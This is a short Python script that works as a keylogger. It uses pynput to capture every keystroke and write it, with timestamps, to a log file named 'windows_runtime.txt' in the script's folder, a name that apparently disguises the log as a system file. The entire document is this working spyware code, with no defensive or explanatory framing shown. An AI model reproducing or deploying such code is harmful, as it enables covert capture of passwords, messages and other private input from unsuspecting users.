import logging
from pynput.keyboard import Listener

script_path = '\\'.join(__file__.split('\\')[0:-1])+'\\'
log_file = "windows_runtime.txt"

logging.basicConfig(
                    filename=(script_path + log_file), 
                    level=logging.DEBUG, 
                    format='[%(asctime)s, %(message)s]', 
                    datefmt=None
                    )

def on_press(key):
    logging.info('"{0}"'.format(key))


with Listener(on_press=on_press) as listener:
    listener.join()
